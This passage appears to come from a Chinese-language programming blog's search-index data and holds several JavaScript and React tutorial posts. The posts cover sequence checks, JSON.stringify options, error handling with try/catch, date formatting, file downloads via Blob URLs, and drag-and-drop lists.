，那就意味著會超出迴圈的「最大範圍」；或反過來說，如果 i 是從 0 ~ n-1，那 i-1 就會超出迴圈的「最小範圍」。只要其中一項發生，那你的執行結果就一定會有問題。 更好的做法－預設值我們可以先假設一個預設的「公比值」，接著在利用迴圈來做判斷： 12345678function isSequence(arr) { let n = arr[1] / arr[0] // 預設公比值 for(let i=1; i&lt;arr.length; i++) { if(arr[i]/arr[i-1] !== n) return false } return true}console.log(isSequence([1, 2, 4, 8, 16])) // true 如果一個數列真的是「等比數列」，那一定會符合我們預設的公比，所以能做出正確的判斷。 另外，迴圈區塊中的 arr[i] 都有乖乖待在迴圈的最大與最小範圍，所以不會有超出的問題。 所以這樣子寫起來就相對直覺，也能解出正確的解答。這個做法就跟 求次大值 的概念雷同，都是先假設一個「預設值」來做判斷。 養成好習慣，適當處理邊角案例這一題的邊角案例會是 [] 或是 [1]，就是「空陣列」或是「只有一個元素」。如果假設這兩個 case 都視為等比數列，那我們應該會這樣寫： 12345678910function isSequence(arr) { if(arr.length &lt;= 1) return true // 邊角案例 let n = arr[1] / arr[0] for(let i=1; i&lt;arr.length; i++) { if(arr[i]/arr[i-1] !== n) return false } return true}console.log(isSequence([])) // trueconsole.log(isSequence([1])) // true 但其實你仔細觀察會發現，就算不加上這個判斷，最後的結果也會是 true。 123456789function isSequence(arr) { let n = arr[1] / arr[0] for(let i=1; i&lt;arr.length; i++) { if(arr[i]/arr[i-1] !== n) return false } return true}console.log(isSequence([])) // 依然是 trueconsole.log(isSequence([1])) // 依然是 true 這是因為當 arr.length 為 0 或 1 的時候，不會通過迴圈的判斷條件 i &lt; arr.length，也就是說不會進到迴圈裡面，直接跳到 return true 的部分。 儘管以這個例子來說確實可以不加上額外判斷，可是還是會建議你加上去，這是一個比較好的習慣。因為如果換成其他的程式語言，在執行到 arr[1] 或 arr[0] 卻發現存取不到元素的時候，是有機會直接噴出一個 error，然後你的程式就執行不下去，最後就 GG 了。","link":"/2021/12/26/is-sequence/"},{"title":"求出 1-100 的平方數","text":"有兩種不同的解法，所以紀錄一下。 解法一利用內建函式： 對 n 開根號 對 n 做無條件捨去 檢查 n 平方是否還等於 i 123456for(let i=1; i&lt;100; i++) { const n = Math.floor(Math.sqrt(i)) if( i === n*n ) { console.log(i) }} 解法二直接把 1-100 內的平方數給印出來 利用 while 來設定條件為「當 i 平方 &lt;= 100」時才執行迴圈區塊： 12345i = 1while(i*i &lt;= 100) { console.log(i*i) i++}","link":"/2021/12/23/is-squre-number/"},{"title":"JavaScript－關於 JSON 的秘密","text":"不算秘密的秘密。 簡述我們平常有 90% 在處理 JSON 資料時都是直接 JSON.stringify 或是 JSON.parse 來轉換格式。 不過你知道 JSON.stringify 除了資料本身以外它還可以傳入其他參數嗎？這篇就是想介紹一下這個奇妙的東西。 首先如果利用 vscode 的懸停功能來查看型別，就會看到以下資訊： 會發現有三個參數，分別為： value replacer space 除了 value 以外應該不多人碰過，所以下面就來介紹一下用法。 替換參數（replacer）這個有兩種用法，第一種是傳「陣列」，第二種是傳「函式」。 Array 的用法： 123456789101112const data = { id: 1, name: 'PeaNu', age: 20, habit: 'coding', gender: 'man', isMarry: true}// 只希望留下的欄位const replacer = ['id', 'age', 'name']// \"{'id':1,'age':20,'name':'PeaNu'}\"console.log(JSON.stringify(data, replacer)) Function 的用法： 附註：你可以利用 key &amp; value 來決定要怎麼過濾資訊。 12345678910111213141516171819const data = { id: 1, name: 'PeaNu', age: 20, habit: 'coding', gender: 'man', isMarry: true}const replacer = (key, value) =&gt; { // 不想留下的就回傳 undefined if (typeof value === 'string') { return undefined } // 想留下的就把值回傳 return value}// \"{'id':1,'age':20,'isMarry':true}\"console.log(JSON.stringify(data, replacer)) 字串間隔（Space）可以填的值有兩種，分別為「字串」和「數字」。 數字的話就是「每個 key 到上一個 , 之間的間隔 」： 12345678910const data = { id: 1, name: 'PeaNu', age: 20, habit: 'coding', gender: 'man', isMarry: true}// 間隔 10console.log(JSON.stringify(data, null, 10)) 123456789// 每個 key 到 , 之間有 10 個空格{----------\"id\": 1,----------\"name\": \"PeaNu\",----------\"age\": 20,----------\"habit\": \"coding\",----------\"gender\": \"man\",----------\"isMarry\": true} 字串的話就是直接填入： 12345678910const data = { id: 1, name: 'PeaNu', age: 20, habit: 'coding', gender: 'man', isMarry: true}// 填入 #console.log(JSON.stringify(data, null, '#')) 12345678{#\"id\": 1,#\"name\": \"PeaNu\",#\"age\": 20,#\"habit\": \"coding\",#\"gender\": \"man\",#\"isMarry\": true} 雖然不太知道這個實際會用在哪，不過也許在過濾資料的時候會當作關鍵字來用吧，像是 split 之類的。","link":"/2022/07/19/javascript-about-json-method/"},{"title":"關於 Catch Error 的實際案例","text":"錯誤處理很重要。 簡述這篇可以當作是從 JavaScript－處理錯誤的方法 延伸出來的筆記，所以會假設你已經知道下面這幾個概念： 知道 try...catch..finally 的流程 知道 throw new Error() 是什麼？跟會發生什麼事？ 知道 Error 物件是什麼？還有 Error 的類別 總之這篇只是想舉幾個比較特別的範例，所以基本概念不會講太多。 案例一：當頁面載入時有很多資料要初始化這應該是蠻常見的案例，以我在工作的經驗來說，就有碰到下拉選單項目是透過 API 拿到的資料來產生的，所以 useEffect 中就會有一大堆 API 要打，像這樣： 1234567useEffect(() =&gt; { getDropdown1.then((response) =&gt; setDropdownList1(response)) getDropdown2.then((response) =&gt; setDropdownList2(response)) getDropdown3.then((response) =&gt; setDropdownList3(response)) getDropdown4.then((response) =&gt; setDropdownList4(response)) ...}, []) 這種時候你應該就會想要把這些東西包成一個 function 來處理，不然要處理錯誤的話很麻煩，會變成這樣： 1234567891011121314useEffect(() =&gt; { getDropdown1 .then((response) =&gt; setDropdownList1(response)) .catch((error) =&gt; setError(error.message)) getDropdown2 .then((response) =&gt; setDropdownList2(response)) .catch((error) =&gt; setError(error.message)) getDropdown3 .then((response) =&gt; setDropdownList3(response)) .catch((error) =&gt; setError(error.message)) getDropdown4 .then((response) =&gt; setDropdownList4(response)) .catch((error) =&gt; setError(error.message))}, []) 所以就要透過 function 來包裝會更簡潔一點。不過在那之前我想先強調一個很重要的觀念： catch 要留到最外層來做 catch 要留到最外層來做 catch 要留到最外層來做 什麼意思？我們先假設最後包裝好的結果會像這樣： 12345useEffect(() =&gt; { getInitDropdown() .then(() =&gt; console.log('finish')) .catch((error) =&gt; setError(error.message))}, []) 如果你要把 error 留到這邊來處理，那麼在 getInitDropdown 中就不可以出現任何 catch。 下面是錯誤的範例： 附註：加上 async 後最後才會回傳 Promise 1234567891011121314async function getInitDropdown() { await getDropdown1 .then((response) =&gt; setDropdownList1(response)) .catch((error) =&gt; setError(error.message)) await getDropdown2 .then((response) =&gt; setDropdownList2(response)) .catch((error) =&gt; setError(error.message)) await getDropdown3 .then((response) =&gt; setDropdownList3(response)) .catch((error) =&gt; setError(error.message)) await getDropdown4 .then((response) =&gt; setDropdownList4(response)) .catch((error) =&gt; setError(error.message))} 如果是這樣寫，當任何一個地方出現 Error 時就會被它最靠近的 catch 給接住，這時候外面的 getInitDropdown 就沒辦法 catch 到，因為已經先被裡面的 function 被接走了。 可以參考 PJCHENder 說的這一段： 當 JavaScript 程式執行的過程中發生錯誤時，它會丟出例外狀況（throw an exception），JS 並不會繼續往下走，而是尋找有沒有任何程式碼能夠處理這些錯誤（exception handling code），如果沒有找到任何可以處理錯誤狀況的程式碼，則它會從丟出例外狀況的函式中跳出（return），就這樣重複尋找錯誤處理的程式碼、跳出，直到觸及到最外層的函式（top level function）後終止。 這個就是 JS 裡 catch 的機制，一定一定要搞清楚這一段。 所以呢，除非你有要針對特定的 getDropdown 做額外處理，不然請一律不要加上任何 catch，留給最外層來做就好： 123456async function getInitDropdown() { await getDropdown1.then((response) =&gt; setDropdownList1(response)) await getDropdown2.then((response) =&gt; setDropdownList2(response)) await getDropdown3.then((response) =&gt; setDropdownList3(response)) await getDropdown4.then((response) =&gt; setDropdownList4(response))} 改成這樣以後，代表只要有任何一個地方出錯就會立刻 return 出去，然後進入 getInitDropdown 的 catch 區塊。 案例二：我想在 custom hook 中 catch 錯誤，但也希望元件能夠 catch 到。你應該會覺得我在公 three 小，不過這確實是我當初碰到的一個問題，所以我會邊舉例邊說明。 首先我們要把 這個表單範例 寫成一個 custom hook，寫完後會像這樣來用它： 12345678910111213141516171819202122import './styles.css'import { useForm } from './useForm'export default function App() { const { name, job, updateJob, updateName, addNewUser, error, loading } = useForm() return ( &lt;div className='container'&gt; &lt;h1&gt;Catch Error at custome hook&lt;/h1&gt; &lt;form onSubmit={addNewUser}&gt; {error &amp;&amp; &lt;div className='error'&gt;{error}&lt;/div&gt;} &lt;div className='label'&gt;Name: &lt;/div&gt; &lt;input type='text' value={name} onChange={updateName} /&gt; &lt;div className='label'&gt;Job: &lt;/div&gt; &lt;input type='text' value={job} onChange={updateJob} /&gt; &lt;div className='btn-wrap'&gt; &lt;button&gt;{loading ? 'sending...' : 'submit'}&lt;/button&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; )} 這個 useForm 做的事情有幾個： 有 Error 時顯示錯誤訊息 在 Loading 時顯示讀取狀態 把 input 值跟 state 做綁定 表單送出時執行 addNewUser 發出 request 好，假設我們現在希望 addNewUser 完之後做一個「redirect」的動作的話，怎麼寫？ 這是 addNewUser 目前的邏輯： 12345678910111213141516const addNewUser = (e) =&gt; { e.preventDefault() setLoading(true) fetch(url, { method: 'post', body: JSON.stringify({ name, job }) }) .then(() =&gt; { console.log('add succuess') setLoading(false) }) .catch((error) =&gt; { setLoading(false) setError(error.message) })} 雖然最簡單的方法是直接把 redirect 的邏輯直接寫在裡面，但考慮到「重用性」的話不會這樣做。 所以比較好的改法是加上 async，讓 addNewUser 結束後可以被下一個 then 接下去： 1234567891011121314151617const addNewUser = async (e) =&gt; { e.preventDefault() setLoading(true) // 記得加上 await 才會等這邊執行完才 return await fetch(url, { method: 'post', body: JSON.stringify({ name, job }) }) .then(() =&gt; { console.log('add succuess') setLoading(false) }) .catch((error) =&gt; { setLoading(false) setError(error.message) })} 接著元件的部分再改寫成這樣： 123456789101112131415161718192021222324252627import './styles.css'import { useForm } from './useForm'export default function App() { const { name, job, updateJob, updateName, addNewUser, error, loading } = useForm() // 記得要把 event 要傳進去才不會出錯 const handleSubmit = (e) =&gt; { addNewUser(e).then(() =&gt; console.log('redirect to some where.')) } return ( &lt;div className='container'&gt; &lt;h1&gt;Catch Error at custome hook&lt;/h1&gt; &lt;form onSubmit={handleSubmit}&gt; {error &amp;&amp; &lt;div className='error'&gt;{error}&lt;/div&gt;} &lt;div className='label'&gt;Name: &lt;/div&gt; &lt;input type='text' value={name} onChange={updateName} /&gt; &lt;div className='label'&gt;Job: &lt;/div&gt; &lt;input type='text' value={job} onChange={updateJob} /&gt; &lt;div className='btn-wrap'&gt; &lt;button&gt;{loading ? 'sending...' : 'submit'}&lt;/button&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; )} 這樣就完成了。 OK，剛剛說的都只是鋪陳，現在要講的東西才是重頭戲： 如果我也想要在外面 catch 錯誤的話怎麼辦？ 這個就是一開始標題提到的情境，希望做到這邊後你有清楚一些了。 之所以要這樣是因為我們不想要在發生錯誤時做 redirect 的動作，所以會希望出錯時能夠 catch 錯誤。 這時候你可能會問說「阿就跟剛剛一樣把 catch 挪到最外層來做不就好了？」，像是這樣： 123456789101112const addNewUser = async (e) =&gt; { e.preventDefault() setLoading(true) await fetch(url, { method: 'post', body: JSON.stringify({ name, job }) }).then(() =&gt; { console.log('add succuess') setLoading(false) }) // 把 catch 拿掉} 但很抱歉，不行。 當你這樣做以後，你會發現另一個問題： 沒辦法取消 loading 狀態 沒辦法把表單的錯誤訊息秀出來 不要忘了這兩個 state 都是封裝在裡面來處理的，所以除非你把 hook 裡的 setError 跟 setLoading 也 export 到外面給元件用，不然你沒辦法解決這個問題。 那該怎麼辦才好呢？ 永遠不要忘了我們可以自己拋出 Error 永遠不要忘了我們可以自己拋出 Error 永遠不要忘了我們可以自己拋出 Error 雖然聽起來很奇妙，但這個就是解法，只要在 catch 中在拋出另一個 Error 就好了，像這樣： 123456789101112131415161718const addNewUser = async (e) =&gt; { e.preventDefault() setLoading(true) await fetch(url, { method: 'post', body: JSON.stringify({ name, job }) }) .then(() =&gt; { console.log('add succuess') setLoading(false) }) .catch((error) =&gt; { setLoading(false) setError(error.message) // 改完 state 後拋出新的錯誤 throw new Error(err) })} 因為這個 Error 是在 catch 中發生的，所以它就會到外面找另一個 catch 來接住。 透過這種手法就可以讓元件也能 catch 錯誤，然後做對應的處理： 1234567891011121314151617181920212223242526272829import './styles.css'import { useForm } from './useForm'export default function App() { const { name, job, updateJob, updateName, addNewUser, error, loading } = useForm() const handleSubmit = (e) =&gt; { // 現在能 catch error 了 addNewUser(e) .then(() =&gt; console.log('redirect to some where.')) .catch((error) =&gt; console.log(error.message)) } return ( &lt;div className='container'&gt; &lt;h1&gt;Catch Error at custome hook&lt;/h1&gt; &lt;form onSubmit={handleSubmit}&gt; {error &amp;&amp; &lt;div className='error'&gt;{error}&lt;/div&gt;} &lt;div className='label'&gt;Name: &lt;/div&gt; &lt;input type='text' value={name} onChange={updateName} /&gt; &lt;div className='label'&gt;Job: &lt;/div&gt; &lt;input type='text' value={job} onChange={updateJob} /&gt; &lt;div className='btn-wrap'&gt; &lt;button&gt;{loading ? 'sending...' : 'submit'}&lt;/button&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; )} 好啦，這個就是這篇要講的東西，有任何疑問的話可以到這邊來看範例。","link":"/2022/06/23/javascript-catch-error-example/"},{"title":"惱人的日期格式","text":"希望寫下來後可以一勞永逸。 簡述每次碰到 Date 這玩意兒，我就得找半天才能找出想要的格式，所以我決定把常用到的給寫下來。 2021-04-01原理是先轉成 ISO 格式在做字串處理 12const date = new Date('2022-04-01T00:00:00.000Z')console.log(date.toISOString().split('T')[0]) 2021/04/01undefined 可以改成時區。 12345678const date = new Date('2022-04-01T00:00:00.000Z')const result = date.toLocaleDateString( undefined, { year: \"numeric\", month: \"2-digit\", day: \"2-digit\",})console.log(result) 2021/4/1123const date = new Date('2022-04-01T00:00:00.000Z')const result = date.toLocaleDateString()console.log(result) 或者是 12const date = new Date('2022-04-01T00:00:00.000Z')console.log(new Intl.DateTimeFormat('zh-TW').format(date)); 下午7:59:34123const date = new Date()const result = date.toLocaleTimeString()console.log(result)","link":"/2022/04/01/javascript-date-formate/"},{"title":"JavaScript－實作下載檔案的方式","text":"趁早填坑。 簡述在實際介紹下載檔案的方法前，我覺得先認識底下幾個東西會比較好上手： &lt;input type=\"file\"&gt; 的使用方式 window.URL.createObjectURL 的用法 Blob 資料格式和轉換格式的觀念 看完後你就會覺得下載檔案並沒有想像中那麼困難囉。 先從 HTML 標籤開始要讓使用者上傳檔案的話基本上都會透過 &lt;input type=\"file\"&gt; 來實作，他的基本用法是像這樣： 1&lt;input type=\"file\" multiple accept=\"image/*\" /&gt; 123document.querySelector('input').addEventListener('change', function () { console.log(this.files)}) 輸出結果： 懶人包： input 可以用來讓使用者上傳檔案，依據需求可以添加 multiple 來決定使否能多選？accept 決定只能選擇哪些 MIME 類型的檔案 input 節點會有 files 這個屬性，就是 File 物件（儲存檔案的資訊） createObjectURL他是一個 HTML5 的 API，我們先來看它在文件上的定義： Object URL is a URL representing a object. The URL lifetime is tied to the document in the window on which it was created. The new object URL represents the specified File object or Blob object. — MDN 簡單來說他是用來「建立 URL 的一個物件」，但這個物件的值必須是「File」或是「Blob」。 File 可以透過 &lt;input type=\"file\"&gt; 上的 files 屬性來取得，而 Blob 則是一種資料格式。如果目前不太懂這兩個東西也沒關係，後面會再解釋，只要先記得下面這個原則就好： 輸入：File / Blob 輸出：URL 重點在於輸出URL，因為是 URL 的關係，所以只要是任何使用 URL 的標籤都可以拿來用，像是 &lt;img&gt; 和 &lt;a&gt;（通常是拿來做下載功能）。 這邊有一個很經典的例子：如果我想實作預覽圖片的功能怎麼做？這很常出現在「換頭像」的時候。 順道一提這種作法是有好處的，可以參考這篇：HTML5 神奇的 Object URL：不用後端，前端便能產生獲取指定物件的網址 只要透過 createObjectURL 可以很輕鬆的做到這件事： 123&lt;div class=\"container mt-5\"&gt; &lt;input type=\"file\" accept=\"image/*\" /&gt;&lt;/div&gt; 123456789101112131415161718document.querySelector('input').addEventListener('change', function () { // reset screen document.querySelector('p')?.remove() document.querySelector('img')?.remove() // show message when no file selected if (this.files.length === 0) { const p = document.createElement('p') p.innerText = 'Not select any files' document.querySelector('.container').append(p) return } // show preview img const img = document.createElement('img') const url = window.URL.createObjectURL(this.files[0]) img.src = url img.classList.add('img') document.querySelector('.container').append(img)}) 實際範例可以參考這裡。 關於 Blob 與 FileBlob 其實就是一種「資料格式」，Blob 是縮寫，全名為「Binary Large Object（二進位大型物件）」，而 File 是基於 Blob 來製作的另一種資料格式，所以本質上是差不多的東西。 這就跟 JSON 是一樣的道理，兩個都只是用來表示資料的一種「格式」，不用想得太複雜。 不過我們都知道碰到 JSON 時我們要用 JSON.parse 來解析，那 Blob 呢？ 這邊要先說一個重要觀念： JS 本身就是只能操作 JavaScript，而 Blob 沒辦法像 JSON 一樣可以轉換成 JavaScript，所以你是沒辦法直接用 JS 來操作 Blob 的。 你唯一能做的就是透過 Blob 來產生一段 url，接著再綁到對應的 HTML 標籤上來做處理（下載 or 顯示內容），畢竟 blob 的用途主要就是拿來處理檔案。 所以這邊先講步驟，待會再來示範： 建立 Blob 物件 透過 createObjectURL 來建立一個屬於 blob 的 URL 把 URL 綁到相關的 HTML 標籤上 這邊我要示範的是把一份 JSON 資料轉成 Blob，接著再把這個 Blob 轉成連結來打開它： 12345678910const jsonData = JSON.stringify({ hello: 'blob' }, null, 2)// 1. create blobconst jsonBlob = new Blob([jsonData], { type: 'application/json' })// 2. create urlconst url = window.URL.createObjectURL(jsonBlob)// 3. bind to domconst a = document.createElement('a')a.href = urla.innerText = 'JSON'document.body.append(a) 附註：實際示範可以參考這邊 補充一下 new Blob 的部分： 簡單來說他會接收兩個參數，第一個是「你要轉換的資料（必須放在陣列裡）」，第二個則是「MIME Type（簡單來說就是檔案類型啦）」，所以 new Blob([jsonData], { type: 'application/json' }) 的意思就是： [jsonData] = 要轉換的資料 { type: 'application/json' } = MIME type 至於詳細的 MIME 列表可以參考 MDN 實作下載檔案其實主要的概念就是前面說的 new Blob 和 createObjectURL ，所以這邊就直接附上 code： （這邊是透過 API 來取得對應的 Excel 檔案） 123456789101112131415161718api .exportFile(requestData) .then((response: any) =&gt; { // 檔案名稱 const fileName = response.headers['content-disposition'].split('filename=')[1] const blob = new Blob([response.data], { type: response.headers['content-type'] }) const url = window.URL.createObjectURL(blob) const link = document.createElement('a') link.href = url link.setAttribute('download', fileName) document.body.appendChild(link) // dowload link.click() link.remove() }) .catch((error: any) =&gt; { Notification('error', error.message) }) 這段的背後其實只是把 blob 產生的網址拿來寫入這段 HTML 後再幫你自動點擊： 1234&lt;a href=\"blob:http://localhost:2051/4db51291-7057-4975-a6d5-727d0084c093\" download=\"IR_Export_20220719113912.xlsx\"&gt;&lt;/a&gt; 附註：當 &lt;a&gt; 有 dowload 屬性時就等於下載檔案 所以下載檔案的實作還蠻單純的，只要搞清楚資料格式怎麼轉換就好了。順道一提，如果檔案是透過 AJAX 來取得的話，請務必： 在 header 加上 responseType = 'blob' 在 header 加上 responseType = 'blob' 在 header 加上 responseType = 'blob' 這樣子才會把 response 轉成 blob 的形式。看很多人都被這個雷到，所以特別強調一下。","link":"/2022/07/22/javascript-dowload-feature/"},{"title":"JavaScript－如何操作可拖曳的元素","text":"新的酷東東。 簡述拖曳可以應用的場景有很多，像是： 用拖拉的方式來上傳檔案 用拖拉的方式來交換元素位置 把東西從 A 拖拉到 B 點（例如驗證 or 圖形介面） 所以覺得這還蠻值得學的，可以運用的地方有很多。 首先來一個 MDN 的範例，我們要做的是像這樣的效果： 如果你想直接看原始碼的話可以到 Codepen 上看，接下來會逐步介紹相關的 API 和思路。 這邊先補充一個概念，如果要讓一個元素是「draggable（可拖曳）」 的話，要加上 draggable=\"true\" 這個屬性： 1&lt;div class=\"ball\" draggable=\"true\"&gt;&lt;/div&gt; 如果沒有加的話預設都是無法拖曳的，所以一定要記得哦。 接著來解釋這邊用到的 API，總共有三個： dragstart dragover drop dragstart 當元素開始被拖曳的時候會觸發。 這邊是利用了這個 function 來取得「目前拖曳的元素是誰」： 1234let dragItem = nulldocument.addEventListener('dragstart', (e) =&gt; { dragItem = e.target}) 之所以要存起來是因為我們希望在「某個時機點」把它插到其他 DOM 元素上，所以才需要這個 reference。 dragover 當有「draggable（元素 / 檔案）」的東西被拖曳進來時觸發，而且是連續觸發。 這邊通常可以做 dragging 的醒目效果，不過更重要的是 e.preventDefault，因為它可以： 讓元素從「不能被 drop」變成「可以被 drop」的狀態。 讓元素從「不能被 drop」變成「可以被 drop」的狀態。 讓元素從「不能被 drop」變成「可以被 drop」的狀態。 以目前的範例來說不是很好懂，所以這邊會用另一個範例解釋。 要看一個元素是否能 drop 可以從 cursor 有沒有顯示 + 號 來判斷，像這樣： 灰色區塊因為有加上 e.preventDefault，所以當它被紅球 dragover 時就會顯示 + 號，代表這裡是可以 drop 的。 詳細可以自己到 Codepen 上玩玩看。 drop 當「draggable（元素 / 檔案）」的東西放掉的時候觸發。 回到原本的例子，我們希望在「紅球放掉的時候」來更新他的位置，所以寫了這樣的判斷： 12345678910111213document.addEventListener('drop', (e) =&gt; { // 停用預設的 download 行為（重要） e.preventDefault() // drop 到的那個元素 const targetElement = e.target // 判斷 target 是否正確 if (targetElement.classList.contains('dropzone')) { // 移除 dragItem.parentNode.removeChild(dragItem) // 插入 e.target.append(dragItem) }}) 簡單來說只要紅球 drop 的元素有 dropzone 這個 calss 就會「更新位置」，所以大致的思路就是這樣。 不過這邊想特別提一件事情，就是要注意「 addEventListener 是綁在誰身上？」 會提這個是因為當「綁定的對象不同時思路也會不同」。以剛剛的範例來看都都是綁在 document 身上，所以像是 drop 不管是在哪裡發生的都會被觸發。 可是如果現在 addEventListener 是掛在 .target 身上的話就不一樣了，這樣就只有在「東西被 drop 到它身上時」才會觸發這個事件（有點像是第一人稱跟第三人稱的差別），這一段如果不懂的話建議自己多寫幾個範例來玩玩看，應該比較能體會我想表達的意思。 製作可拖曳的列表 這個算是蠻常見的需求，所以能練習一下。至於思路都寫在註解中了，不懂的話試著自己做做看就懂了。 可能會比較有疑問的地方應該是 e.dataTransfer 的部分，這裡稍微解釋一下。簡單來說就是讓你「幫被拖曳的元素儲存資訊」，這樣子在做判斷時才有相關的 reference，詳細的用法可以參考 MDN，或這篇 文章 JavaScript + jQuery123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;body&gt; &lt;ul class=\"list\"&gt; &lt;li&gt;One&lt;/li&gt; &lt;li&gt;Two&lt;/li&gt; &lt;li&gt;Three&lt;/li&gt; &lt;li&gt;Four&lt;/li&gt; &lt;/ul&gt; &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js\"&gt;&lt;/script&gt; &lt;script&gt; // 取得所有 li const items = document.querySelectorAll('li') // 設定 property 和 listener items.forEach((li) =&gt; { $(li).prop('draggable', true) li.addEventListener('dragstart', dragStart) li.addEventListener('drop', dropped) li.addEventListener('dragover', (e) =&gt; e.preventDefault()) }) function dragStart(e) { // 取得 index const index = $(e.target).index() // 設定被拖曳元素的資訊，之後可透過 getData() 來取得 e.dataTransfer.setData('text/plain', index) } function dropped(e) { e.preventDefault() // 記得轉成數字 const oldIndex = parseInt(e.dataTransfer.getData('text/plain'), 10) const target = $(e.target) const newIndex = $(e.target).index() // remove orignal element // 1. 找到 parent // 2. 把第 oldIndex 個 child 給移除 // 3. 把回傳值儲存（被刪除的元素） const dropped = $(this).parent().children().eq(oldIndex).remove() // 新位置（目標）比原本還後面就插到他（新位置）後面，以此類推 oldIndex &lt; newIndex ? target.after(dropped) : target.before(dropped) } &lt;/script&gt;&lt;/body&gt; 原始碼可到 CodePen 參考。 其實最關鍵的地方就是 dragStart 時儲存「原始位置」，接著 dropped 時取得「新的位置」，最後再根據「新 / 舊位置」來判斷要放到那個位置，簡單來說就是這樣吧。 React1234567891011121314151617181920212223242526272829303132export default function App() { const [items, setItems] = useState(['One', 'Two', 'Three', 'Four']) return ( &lt;ul className='list'&gt; {items.map((item, index) =&gt; ( &lt;li draggable='true' key={item} onDragOver={(e) =&gt; e.preventDefault()} onDragStart={(e) =&gt; { // 儲存 drag 時的位置 e.dataTransfer.setData('text/plain', index) }} onDrop={(e) =&gt; { const oldIndex = parseInt(e.dataTransfer.getData('text/plain'), 10) // drop 的位置 let targetIndex = index const newItems = [...items] // remove the old one const removedItem = newItems.splice(oldIndex, 1) // insert to target index newItems.splice(targetIndex, 0, ...removedItem) setItems(newItems) }} &gt; {item} &lt;/li&gt; ))} &lt;/ul&gt; )} 原始碼可到 CodePen 來看。 React 相對來說會直覺一些，畢竟只要專注在「資料」就好，不過要留意一下 splice 的部分。第一個參數可以想成是「我希望元素放到的位置」，這樣子會比較好理解一點。 例如說我想把某個元素放到第一個位置，那就會用 splice(0, 0, item)，第二個的話就是 splice(1, 0, item)，以此類推。就不用像寫 jQuery 時還要多判斷「插到前面還是後面」的這一步。 可拖曳檔案（React）做完上面的練習後應該就能做出這樣的功能： 原始碼可到 CodePen 參考 主要只是多了「上傳檔案」的功能，背後的拖曳邏輯其實都跟剛剛差不多，所以這邊就直接附上 code 不解釋太多了，可以參考註解邊練習看看： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485export default function App() { const [uploadFiles, setUploadFiles] = useState([]) return ( &lt;&gt; &lt;div className='upload'&gt; &lt;p className='upload-title'&gt;Link path&lt;/p&gt; &lt;div className='upload-area' // allow drop onDragOver={(e) =&gt; e.preventDefault()} // receive file (拖曳進來的檔案) onDrop={(e) =&gt; { // prevent dowload e.preventDefault() if (e.dataTransfer.files.length &gt; 0) { setUploadFiles(Array.from(e.dataTransfer.files)) } }} &gt; &lt;div className='upload-area-list'&gt; &lt;ul className='list'&gt; {uploadFiles.map((file, index) =&gt; ( &lt;li draggable='true' key={file.name} onDragOver={(e) =&gt; { // allow drop e.preventDefault() // stop bubbling to parent (.upload-area) e.stopPropagation() }} onDragStart={(e) =&gt; e.dataTransfer.setData('text/plain', index)} onDrop={(e) =&gt; { // prevent dowload e.preventDefault() // stop bubbling to parent (.upload-area) e.stopPropagation() const oldIndex = parseInt(e.dataTransfer.getData('text/plain'), 10) // 避免從桌面拖曳檔案到 li 上的情況 if (!isNaN(oldIndex)) { let targetIndex = index // 因為是 blob 所以得用這種方式 copy const newFiles = uploadFiles.map((file) =&gt; new File([file], file.name)) const removedBackup = newFiles[oldIndex] // remove the old one newFiles.splice(oldIndex, 1) // insert to target index newFiles.splice(targetIndex, 0, removedBackup) setUploadFiles(newFiles) } }} &gt; &lt;span className='file-name'&gt; 0{index + 1}. {file.name} &lt;/span&gt; &lt;span onClick={() =&gt; setUploadFiles((prev) =&gt; prev.filter((f) =&gt; f.name !== file.name)) } className='material-icons material-icons-close' &gt; close &lt;/span&gt; &lt;/li&gt; ))} &lt;/ul&gt; &lt;/div&gt; &lt;button className='upload-area-button'&gt; &lt;span className='material-icons'&gt;file_upload&lt;/span&gt; &lt;input type='file' multiple onChange={(e) =&gt; setUploadFiles(Array.from(e.target.files))} /&gt; &lt;/button&gt; &lt;/div&gt; &lt;/div&gt; &lt;button className='btn-save' onClick={() =&gt; console.log(uploadFiles)}&gt; Save &lt;/button&gt; &lt;/&gt; )} 這邊要特別注意 e.stopPropagation 的功能，如果沒有在該加的地方加上的話就有可能遇到「事件從 children 冒泡到 parent」的問題。 像是假設我在 &lt;li&gt; 觸發了 drop 事件，沒有取消傳遞的話就會冒泡到 .upload-area 的位置上，所以就會變成這樣： 執行 li 的 event callback，把位置交換 執行 .upload-area 的 event callback，更新 state 這就跟我們預期的不一樣了，我們只希望li 的 callback 被執行而已。 所以這邊要特別留意事件傳遞機制的問題，不熟的話可以參考我寫的 阻止事件傳遞 stopPropagation。 雖然你也可以暴力解，通通加上 stopPropagation 和 preventDefault，但我覺得去理解他們實際到底在「預防什麼」會更好。","link":"/2022/08/26/javascript-drag-and-drop/"},{"title":"JavaScript－處理錯誤的方法","text":"一步一步弄懂它。 簡述會寫這篇是因為對 JS 的錯誤處理不是很熟，而最近正好碰到了一個不錯的範例，想藉此來解釋一下錯誤處理的流程，跟順便介紹 throw Error 的用法。 範例錯誤處理應該最發生在常串接 API 的時候，所以這邊就用 API 來當範例： 12345678910111213141516171819202122232425function App () { const [data, setData] = useState(null) const [isPending, setIsPending] = useState(false) const [error, setError] = useState(null) useEffect(() =&gt; { const fetchData = async () =&gt; { setIsPending(true) try { const response = await fetch(...) if (!response.ok) throw new Error(response.statusText) const json = await response.json() setData(json) } catch (err) { console.log(err.message) setError('Can not fetch the data') } finally { setIsPending(false) } } fetchData() }, []) return ...} 首先先介紹一下 try...catch...finally 的用途。 try 裡面負責處理「我們預期執行的 code」，一旦這裡面拋出了「Exception（例外情形）」，就會立刻進到 catch 區塊，所以 catch 中會放我們想要「處理例外情形的 code」。 最後是 finally，這個是不論有沒有出現例外情形，最後都會執行到的區塊，所以可以在這邊放「執行正確或錯誤都要執行的東西」。 以上面的例子來說，我們首先用 try 包住了 fetch API 的程式碼，所以如果正確執行的話就會： 取得 API 資料 把資料寫入 state 你可能會想說 if (!response.ok) throw new Error(response.statusText) 的用意何在？ 它的任務可重要了，這是因為對 fetch 而言，只要 request 發的出去都不算是 Exception（很重要的觀念），所以 404 或 500 這些都不算數，既然不算數，就不會進到 catch 區塊，這樣子麻煩可就大了。 